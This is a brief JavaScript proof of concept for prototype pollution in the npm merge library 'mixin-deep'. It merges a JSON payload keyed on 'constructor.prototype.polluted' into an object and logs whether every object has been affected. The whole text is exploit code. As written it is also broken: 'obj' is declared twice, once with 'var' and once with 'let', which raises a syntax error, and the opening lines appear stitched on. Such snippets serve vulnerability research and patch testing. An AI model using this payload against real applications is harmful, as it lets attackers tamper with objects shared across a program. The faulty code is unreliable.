var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const mixin = require('mixin-deep');
const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';
let obj = {};
console.log({}.polluted);
mixin(obj, JSON.parse(payload));
console.log({}.polluted);